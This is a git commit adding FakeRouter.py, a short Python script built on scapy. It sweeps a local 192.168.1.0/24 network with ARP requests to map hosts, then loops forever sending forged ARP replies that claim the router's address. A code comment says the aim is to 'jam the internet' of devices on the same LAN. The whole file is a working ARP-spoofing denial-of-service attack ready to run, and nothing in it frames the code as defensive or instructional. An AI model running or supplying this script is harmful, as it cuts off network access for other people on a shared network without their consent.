1fd3f3fcf76d9c93c1d4df2cbe4635d3adb4dd5c
lianmark <63747960+lianmark@users.noreply.github.com>
2026-01-01 23:19:29 +0200

    Create FakeRouter.py

---
+++ ArpSpoofing/FakeRouter.py
@@ -0,0 +1,27 @@
+# this code is to jam the internet of the devices that are inside the same LAN, not MITM!
+from scapy.all import *
+from scapy.layers.l2 import ARP, Ether
+import time
+arp_table = {}
+
+def get_lan_mac():
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1/24")
+    ans, noans = srp(arp_request, timeout=2, verbose=0)
+    for sent, recv in ans:
+        arp_table[recv.psrc] = recv.hwsrc
+
+def lan_internet_jamming(fake_gateway_ip):
+    while True:
+        print("Sending")
+        try:
+            for ip, mac in arp_table.items():
+                if ip == "192.168.1.1":
+                    continue
+                send(ARP(op=2, pdst=ip, psrc=fake_gateway_ip, hwdst=mac), verbose=0)
+            time.sleep(1)
+        except Exception as e:
+            print("Error:", e)
+
+fake_gateway = "192.168.1.1"
+get_lan_mac()
+lan_internet_jamming(fake_gateway)
